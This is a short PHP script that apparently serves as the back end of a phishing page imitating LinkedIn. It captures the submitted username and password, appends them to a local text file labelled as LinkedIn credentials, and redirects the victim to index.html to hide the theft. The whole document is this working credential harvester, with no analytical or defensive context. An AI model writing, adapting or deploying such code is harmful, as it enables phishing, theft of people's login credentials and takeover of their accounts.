<?php
file_put_contents("usernames.txt", "Linkedin Username: " . $_POST['username'] . " Pass: " . $_POST['pass'] ."\n", FILE_APPEND);
header('Location: index.html');
exit();
?>
